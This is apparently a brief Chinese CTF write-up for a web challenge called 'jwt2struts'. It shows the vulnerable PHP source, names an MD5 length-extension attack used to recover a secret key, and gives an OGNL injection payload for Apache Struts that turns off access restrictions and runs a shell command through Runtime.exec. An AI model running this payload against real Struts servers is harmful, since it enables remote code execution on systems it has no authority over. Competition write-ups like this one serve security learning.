\*ctf
# web
### jwt2struts
```php
<?php
highlight_file(__FILE__);
include "./secret_key.php";
include "./salt.php";
//$salt = XXXXXXXXXXXXXX // the salt include 14 characters
//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df
@$username = urldecode($_POST["username"]);
@$password = urldecode($_POST["password"]);
if (!empty($_COOKIE["digest"])) {
    if ($username === "admin" && $password != "root") {
         if ($_COOKIE["digest"] === md5($salt.$username.$password)) {
            die ("The secret_key is ". $secret_key);
        }
        else {
            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
        }
    }
    else {
        die ("no no no");
    }
}
```

md5扩展攻击

获取到secret-key`sk-he00lctf3r` 根据题目名也知道应该是要考struts
伪造jwt为admin
在age框里输入*payload*可以回显命令执行结果
```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```


# reverse
### GoGpt
一道go的逆向题

# pwn

# crypto

# Misc


---
# *相关wp*




2023-07-31   18:44
